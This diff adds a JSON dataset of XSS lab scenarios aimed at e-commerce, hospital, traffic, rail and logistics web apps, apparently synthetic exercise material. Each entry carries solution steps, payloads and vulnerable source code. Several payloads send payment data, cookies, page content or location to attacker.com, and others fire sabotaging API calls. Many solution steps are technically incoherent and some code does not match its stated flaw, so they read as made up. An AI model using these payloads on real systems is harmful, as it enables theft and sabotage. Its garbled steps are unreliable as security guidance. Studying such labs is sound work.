@@ -1,0 +1,348 @@
+[
+    {
+      "Lab scenario": "DOM XSS in Product Review Carousel",
+      "Lab Description": "An online marketplace renders user reviews in a React carousel using dangerouslySetInnerHTML. The application converts Markdown comments to HTML without sanitizing <details> tags. To solve: Inject XSS that triggers when shoppers expand review details.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Intercept review submission with Burp Suite",
+        "Craft payload: `Rating: 5/5 <details ontoggle=alert('CART_HIJACK') open>`",
+        "Bypass CSP using AngularJS ng-include directive",
+        "Trigger through mobile app's infinite scroll"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "<img src='x' onerror='navigator.sendBeacon(\"https://attacker.com\", localStorage.paymentData)'>",
+        "<details open ontoggle=\"fetch('/api/cart?delete=true')\">"
+      ],
+      "srcCode": "function Review({ text }) {\n  return <div dangerouslySetInnerHTML={{ __html: marked.parse(text) }} />;\n}"
+    },
+    {
+      "Lab scenario": "Stored XSS in Loyalty Point Calculator",
+      "Lab Description": "A retail chain's CRM stores customer tier calculations in PostgreSQL with disabled pg_escape_string. The Vue frontend renders loyalty status using v-html. To solve: Inject XSS through crafted purchase history that executes during point redemption.",
+      "Difficulty Level": "High",
+      "Solution Steps": [
+        "Use Postman to send payload: {\"purchases\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
+        "Bypass GraphQL input validation using alias injection",
+        "Exploit Highcharts tooltip rendering vulnerabilities",
+        "Trigger through birthday reward emails"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"history\":\"</textarea><script>alert('LOYALTY_OVERRIDE')</script>\"}",
+        "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script>"
+      ],
+      "srcCode": "app.post('/loyalty', async (req, res) => {\n  await pool.query('INSERT INTO purchases VALUES ($1)', [req.body.history]);\n});"
+    },
+    {
+      "Lab scenario": "Mutation XSS in AR Virtual Try-On",
+      "Lab Description": "A fashion app's WebGL-based virtual mirror parses JSON accessory metadata without HTML entity encoding. The application converts product SKUs to tooltips using innerHTML. To solve: Craft SKU containing XSS that executes when users share looks.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Modify product feed: {\"sku\":\"DRESS-3Cscript3Ealert(1)\", ...}",
+        "Bypass 3D model validation using Babylon.js texture injection",
+        "Exploit WebXR anchor point synchronization",
+        "Trigger through social media sharing"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"id\":\"TSHIRT-<script>alert('TRYON_DATA')</script>\"}",
+        "<model><body onload=\"document.write('<iframe src=attacker.com>')\"/>"
+      ],
+      "srcCode": "gltfLoader.load(modelUrl, (gltf) => {\n  document.getElementById('tooltip').innerHTML = gltf.userData.sku;\n});"
+    },
+    {
+      "Lab scenario": "DOM XSS in Flash Sale Countdown Timer",
+      "Lab Description": "A deal site's Next.js timer component reflects URL parameters in its SVG-based countdown. The application uses date-fns without escaping timezone abbreviations. To solve: Inject XSS through crafted tz parameter during daylight saving transitions.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Modify URL: ?tz=EST<svg/onload='fetch(\"/api/coupons?apply=all\")'>",
+        "Bypass Intl.DateTimeFormat validation using legacy TZ aliases",
+        "Exploit requestIdleCallback timing attacks",
+        "Trigger through email reminder links"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "?tz=GMT+<script>document.write('<img src=//attacker.com?c='+document.cookie)>",
+        "<animate attributeName=\"opacity\" values=\"1; <script>alert(1)</script>\" dur=\"1s\"/>"
+      ],
+      "srcCode": "export default function Timer({ params }) {\n  return <div dangerouslySetInnerHTML={{ __html: format(params.tz) }} />;\n}"
+    },
+    {
+      "Lab scenario": "Stored XSS in Supply Chain Inventory API",
+      "Lab Description": "A warehouse management system stores stock codes in MongoDB without input validation. The Angular frontend renders pallet locations using [innerHTML]. To solve: Inject XSS through RFID tag data that executes during stock takes.",
+      "Difficulty Level": "Critical",
+      "Solution Steps": [
+        "Spoof RFID tags with payload: STOCK-<script>alert('SUPPLY_CHAIN')</script>",
+        "Bypass EPC Gen2 encoding checks using TID memory banks",
+        "Exploit AGV robot path visualization",
+        "Trigger through cold chain monitoring alerts"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"location\":\"Aisle 3 <img src=x onerror='new AudioContext().createScriptProcessor()'>\"}",
+        "<math><maction actiontype=\"statusline#xss\">alert(1)</maction>"
+      ],
+      "srcCode": "this.http.get('/stock').subscribe(res => {\n  this.inventory = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
+    },
+    
+        {
+          "Lab scenario": "DOM XSS in Patient Portal Lab Results Viewer",
+          "Lab Description": "A hospital EHR system renders PDF lab reports as HTML using pdf-lib without proper sanitization. The application converts PDF annotations to DOM elements using innerHTML. To solve: Inject XSS through crafted lab comments that execute when doctors view results.",
+          "Difficulty Level": "High",
+          "Solution Steps": [
+            "Use PDFKit to create malicious annotation: /Contents (<script>alert('PHI_LEAK')</script>)",
+            "Bypass PDF/A-3 validation using incremental updates",
+            "Exploit Mozilla pdf.js rendering vulnerabilities",
+            "Trigger through multi-provider consults"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "BT /F1 12 Tf 0 Tc 0 Tw ( <script>navigator.sendBeacon('https://attacker.com', document.body.innerHTML)</script> ) Tj ET",
+            "<</Type/Annot/Subtype/Text/Contents(<iframe/src=javascript:alert(1)>>"
+          ],
+          "srcCode": "pdfDoc.getAnnotations().then(annots => {\n  document.getElementById('comments').innerHTML = annots.map(a => a.contents);\n});"
+        },
+        {
+          "Lab scenario": "Stored XSS in MRI Machine Scheduling System",
+          "Lab Description": "A radiology workflow manager stores DICOM metadata in MariaDB with disabled input escaping. The Angular frontend renders patient preparation instructions using [innerHTML]. To solve: Inject XSS through crafted scan protocols that persist across modality worklist updates.",
+          "Difficulty Level": "Critical",
+          "Solution Steps": [
+            "Modify MWL request: (0040,0275) <svg/onload='fetch(\"/api/scanners?force_recalibrate=true\")'>",
+            "Bypass DICOM VR validation using multi-frame injection",
+            "Exploit OpenLayers ROI annotation rendering",
+            "Trigger through contrast agent alerts"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "(0010,0010) PN [<script>alert('PATIENT_SWAP')</script>]",
+            "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=\"alert(1)\">"
+          ],
+          "srcCode": "app.post('/mwl', (req, res) => {\n  pool.query('INSERT INTO schedule VALUES ?', [req.body]);\n});\n// Client:\n<div [innerHTML]=\"protocol\"></div>"
+        },
+        {
+          "Lab scenario": "Mutation XSS in Telemedicine Video Chat",
+          "Lab Description": "A telehealth platform converts WebRTC data channel messages to HTML using a flawed Markdown parser. The application's emoji shortcode processor allows nested code blocks. To solve: Craft message that bypasses :emoji: syntax to execute script during session recording.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Send chat: :warning:`'><svg/onload='alert(\"DIAGNOSIS_EDIT\")'>",
+            "Bypass DOMPurify using SVG foreignObject injection",
+            "Exploit MediaRecorder API timestamp synchronization",
+            "Trigger through transcript export"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            ":pill: <xmp><plaintext><img src=x onerror=alert(1)>",
+            "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
+          ],
+          "srcCode": "function parseMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
+        },
+        {
+          "Lab scenario": "DOM XSS in Smart Pill Dispenser Mobile App",
+          "Lab Description": "An IoT medication manager renders dosage schedules in React Native WebView without escaping. The application converts NFC tag payloads to HTML using dangerouslySetInnerHTML. To solve: Program NFC tags with XSS that executes when caregivers scan the device.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Use Proxmark3 to write NFC tag: <iframe srcdoc='<script>parent.alert(1)</script>'",
+            "Bypass NDEF Type Name Format validation using empty TNF",
+            "Exploit React Native postMessage handler vulnerabilities",
+            "Trigger through low-stock alerts"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "NDEF Record: TNF=0, PAYLOAD=<script>navigator.bluetooth.requestDevice()</script>",
+            "<math><maction actiontype=\"statusline#xss\">alert('DOSE_OVERRIDE')</maction>"
+          ],
+          "srcCode": "NfcManager.registerTagEvent(tag => {\n  WebView.injectJavaScript(`document.body.innerHTML += '${tag.ndefMessage}'`);\n});"
+        },
+        {
+          "Lab scenario": "Stored XSS in Genomic Data Visualization Portal",
+          "Lab Description": "A precision medicine platform stores VCF files in HDFS without sanitizing INFO fields. The Vue frontend renders variant annotations using v-html. To solve: Inject XSS through crafted genetic markers that execute during cohort analysis.",
+          "Difficulty Level": "Critical",
+          "Solution Steps": [
+            "Modify VCF: INFO=<ID=XSS,Number=1,Type=String,Description=\"<script>alert('DNA_DATA')</script>\"",
+            "Bypass GA4GH schema validation using reserved INFO keys",
+            "Exploit BioJS 3D protein viewer tooltips",
+            "Trigger through pharmacogenomic reports"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "##INFO=<ID=CSQ,Number=.,Type=String,Description=\"<svg/onload='alert(1)'>\"",
+            "chr1\t100\t.\tA\tT\t100\tPASS\tXSS=<iframe/src=javascript:alert(1)>"
+          ],
+          "srcCode": "vcfParser.parse(file).then(data => {\n  this.annotations = data.metadata.info;\n});\n// Template:\n<div v-html=\"annotations.XSS\"></div>"
+        },
+        
+            {
+              "Lab scenario": "DOM XSS in Adaptive Traffic Light Control API",
+              "Lab Description": "A smart traffic system's web interface reflects intersection IDs from URL parameters in Three.js visualizations. The application converts SCATS protocol data to SVG without sanitizing phase timing values. To solve: Inject XSS through crafted phase parameter that executes during emergency vehicle preemption.",
+              "Difficulty Level": "Critical",
+              "Solution Steps": [
+                "Intercept API request: GET /intersection?id=0<script>alert('GRIDLOCK')</script>",
+                "Bypass NTCIP 1202 validation using VISSIM simulation data",
+                "Exploit OpenGL shader error handling",
+                "Trigger through pedestrian crossing activation"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "?id=0<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"/api/lights?state=red\")'>",
+                "{\"phase\":\"3 <math><maction actiontype='statusline#xss'>alert(1)</maction>\"}"
+              ],
+              "srcCode": "app.get('/intersection', (req, res) => {\n  res.render('view', { id: req.query.id });\n});\n// Client:\ndocument.getElementById('signal').innerHTML = id;"
+            },
+            {
+              "Lab scenario": "Stored XSS in Smart Waste Bin Fill-Level Dashboard",
+              "Lab Description": "A municipal waste management system stores ultrasonic sensor data in InfluxDB without input validation. The React frontend renders bin status using dangerouslySetInnerHTML in D3.js heatmaps. To solve: Inject XSS through spoofed MQTT payloads that trigger during collection route optimization.",
+              "Difficulty Level": "High",
+              "Solution Steps": [
+                "Use Node-RED to inject: {\"fill\":\"80%<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
+                "Bypass LoRaWAN payload encryption using OTAA key leakage",
+                "Exploit Leaflet.heat gradient rendering vulnerabilities",
+                "Trigger through predictive maintenance alerts"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "{\"bin_id\":\"TRUCK-<script>navigator.geolocation.getCurrentPosition(e=>fetch('https://attacker.com?loc='+e.coords)</script>\"}",
+                "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
+              ],
+              "srcCode": "mqttClient.on('message', (topic, message) => {\n  ReactDOM.render(<BinStatus data={message} />, root);\n});"
+            },
+            {
+              "Lab scenario": "Mutation XSS in Water Quality Sensor XML Feed",
+              "Lab Description": "A smart water grid parses OGC SensorThings API responses into HTML tables. The application's XML parser fails to handle namespaces in SWE Common data arrays. To solve: Craft malicious sensor observation containing XSS that executes during flood prediction modeling.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Modify observation: <swe:values>3Cscript3Ealert('CONTAMINATION')</swe:values>",
+                "Bypass WaterML 2.0 schema validation using escaped CDATA",
+                "Exploit CesiumJS info box rendering",
+                "Trigger through EPA compliance reports"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "<om:result xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script>",
+                "<!--<script>--><svg/onload=alert(1)>"
+              ],
+              "srcCode": "xmlParser.parseString(data, (err, result) => {\n  document.getElementById('readings').innerHTML = result.toString();\n});"
+            },
+            {
+              "Lab scenario": "DOM XSS in Public Transit Real-Time Map",
+              "Lab Description": "A bus tracking system reflects unsanitized vehicle IDs from GTFS-RT feeds in Mapbox GL popups. The application uses Angular's bypassSecurityTrustHtml for passenger load indicators. To solve: Inject XSS through crafted vehicle positions that execute during route deviation alerts.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Spoof GPS feed: {\"vehicle\":\"VH-<svg/onload='fetch(`/api/vehicles?command=stop`)'/>\"}",
+                "Bypass GTFS trip_update validation using timestamp rollbacks",
+                "Exploit Turf.js buffer calculation vulnerabilities",
+                "Trigger through paratransit booking integrations"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "{\"id\":\"BUS12<script>new Image().src='http://attacker.com?data='+localStorage.schedules</script>\"}",
+                "<math><maction actiontype=\"statusline#xss\">alert('ROUTE_HIJACK')</maction>"
+              ],
+              "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${vehicle.status}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+            },
+            {
+              "Lab scenario": "Stored XSS in Emergency Response Chat Logs",
+              "Lab Description": "A city's crisis management system stores responder messages in Elasticsearch without escaping. The Vue frontend renders incident timelines using v-html. To solve: Inject XSS through crafted triage codes that execute during mutual aid requests.",
+              "Difficulty Level": "Critical",
+              "Solution Steps": [
+                "Send payload: {\"code\":\"CODE-<script>alert('EVAC_ORDER')</script>\"}",
+                "Bypass CAP protocol validation using polygon geofence wrapping",
+                "Exploit ArcGIS API for JavaScript popup vulnerabilities",
+                "Trigger through Everbridge integration alerts"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "{\"incident\":\"</textarea><script>alert('CBRN_LEAK')</script>\"}",
+                "<details open ontoggle=\"navigator.mediaDevices.getUserMedia({video:true})\">"
+              ],
+              "srcCode": "app.post('/incidents', (req, res) => {\n  elasticClient.index({ index: 'alerts', body: req.body });\n});\n// Client:\n<div v-html=\"incident.code\"></div>"
+            },
+
+          
+  {
+    "Lab scenario": "DOM XSS in Autonomous Truck Platooning API",
+    "Lab Description": "A freight management system reflects unsanitized truck IDs from V2V (Vehicle-to-Vehicle) messages in Angular visualizations. The application converts SAE J1939 data to SVG without escaping. To solve: Inject XSS through crafted vehicle spacing parameters that execute during platoon formation.",
+    "Difficulty Level": "Critical",
+    "Solution Steps": [
+      "Intercept DSRC (Dedicated Short-Range Communications) messages using GNU Radio",
+      "Craft payload: {\"truck_id\":\"<svg/onload='fetch(`/api/platoons?disband=true`)'>\"}",
+      "Bypass AASHTO validation using false GNSS timestamps",
+      "Trigger through emergency braking simulations"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+      "truck=TR-<script>document.write('<iframe src=attacker.com>')</script>",
+      "<math><maction actiontype='statusline#xss'>alert('PLATOON_HIJACK')</maction>"
+    ],
+    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${truckData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
+  },
+  {
+    "Lab scenario": "Stored XSS in Maritime Container Tracking System",
+    "Lab Description": "A global shipping portal stores ISO 6346 container codes in MongoDB without input validation. The Vue frontend renders cargo manifests using v-html. To solve: Inject XSS through malicious BIC codes that execute during customs clearance workflows.",
+    "Difficulty Level": "High",
+    "Solution Steps": [
+      "Use Postman to send payload: {\"container\":\"MSKU<script>alert('CARGO_THEFT')</script>\"}",
+      "Bypass SOLAS verification using checksum spoofing",
+      "Exploit Leaflet.markercluster plugin vulnerabilities",
+      "Trigger through hazardous material alerts"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+      "{\"bic\":\"TGHU\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
+      "<img src='x' onerror='navigator.geolocation.watchPosition(p=>fetch(`http://attacker.com?lat=${p.coords.latitude}`))'>"
+    ],
+    "srcCode": "app.post('/containers', (req, res) => {\n  db.collection('cargo').insertOne(req.body);\n});\n// Client:\n<div v-html=\"container.bic\"></div>"
+  },
+  {
+    "Lab scenario": "Mutation XSS in Drone Delivery Waypoint Planner",
+    "Lab Description": "A last-mile delivery system parses GeoJSON waypoints into CesiumJS maps without proper sanitization. The application's XML-to-HTML converter fails to handle KML namespace injections. To solve: Craft malicious flight path containing XSS that executes during FAA airspace checks.",
+    "Difficulty Level": "Medium",
+    "Solution Steps": [
+      "Upload payload: <kml><Document><name><![CDATA[</name><svg/onload=alert('NO_FLY_ZONE')>]]>",
+      "Bypass DJI FlySafe validation using altitude wrapping",
+      "Exploit Three.js glTF model metadata injection",
+      "Trigger through battery level warnings"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+      "<Placemark><name><script>alert(1)</script></name></Placemark>",
+      "{\"coordinates\":\"-118.25,34.05<iframe srcdoc='<script>parent.alert(1)</script>'\"}"
+    ],
+    "srcCode": "kmlParser.parse(file, (err, result) => {\n  document.getElementById('map').innerHTML = result;\n});"
+  },
+  {
+    "Lab scenario": "DOM XSS in Railway Signaling Asset Management",
+    "Lab Description": "A rail network monitoring tool reflects unsanitized track circuit IDs from IEC 62290 telemetry in React dashboards. The application uses dangerouslySetInnerHTML for failure alerts. To solve: Inject XSS through crafted balise parameters that execute during train detection events.",
+    "Difficulty Level": "Hard",
+    "Solution Steps": [
+      "Intercept GSM-R messages using Software Defined Radio",
+      "Craft payload: {\"balise_id\":\"BAL-<svg/onload='fetch(\"/api/signals?aspect=red\")'>\"}",
+      "Bypass ERTMS/ETCS packet validation using CRC32 collisions",
+      "Trigger through axle counter resets"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+      "{\"track\":\"SNCF-<script>alert('SIGNAL_OVERRIDE')</script>\"}",
+      "<details open ontoggle=\"navigator.credentials.get({otp: true})\">"
+    ],
+    "srcCode": "function Signal({ data }) {\n  return <div dangerouslySetInnerHTML={{ __html: data }} />;\n}"
+  },
+  {
+    "Lab scenario": "Stored XSS in Warehouse Robot Pathfinding Interface",
+    "Lab Description": "An automated fulfillment system stores AMR (Autonomous Mobile Robot) grid maps in PostgreSQL with disabled escaping. The Angular frontend renders SLAM trajectories using [innerHTML]. To solve: Inject XSS through malicious navigation waypoints that execute during inventory cycle counts.",
+    "Difficulty Level": "Critical",
+    "Solution Steps": [
+      "Modify ROS navigation_stack parameters: <param name=\"costmap\" value=\"<script>alert('INVENTORY_SABOTAGE')</script>\"",
+      "Bypass OMPL motion planning validation using NaN injections",
+      "Exploit RViz visualization vulnerabilities",
+      "Trigger through picker workstation integrations"
+    ],
+    "Vulnerability name": "Cross-site scripting",
+    "payloads": [
+      "{\"waypoint\":\"Aisle-<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>\"}",
+      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
+    ],
+    "srcCode": "this.http.get('/amr').subscribe(res => {\n  this.grid = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
+  }
+
+      
+]
